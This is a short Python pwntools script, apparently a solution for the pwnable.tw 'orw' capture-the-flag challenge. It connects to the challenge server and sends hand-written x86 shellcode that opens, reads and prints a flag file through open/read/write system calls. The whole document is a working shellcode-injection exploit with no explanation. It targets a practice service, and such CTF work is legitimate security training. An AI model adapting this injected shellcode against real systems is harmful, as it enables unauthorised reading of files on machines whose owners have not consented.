#Exploit for pwnable.tw/orw
from pwn import *

#target = process('./orw')
target = remote('chall.pwnable.tw', 10001)

shellcode = asm('\n'.join([
	'push 0',
	'push 0x67616c66',
	'push 0x2f2f2f77',
	'push 0x726f2f65',
	'push 0x6d6f682f',
	'xor edx, edx',
	'mov ebx, esp',
	'mov ecx, 0x0',
	'mov eax, 0x5',
	'int 0x80',
	
	'mov ebx, eax',
	'mov ecx, 0x804a170',
	'mov edx, 0xff',
	'mov eax, 0x3',
	'int 0x80',
	
	'mov ebx, 0x1',
	'mov eax, 0x4',
	'int 0x80'
]))

target.sendline(shellcode)

print target.recvline()
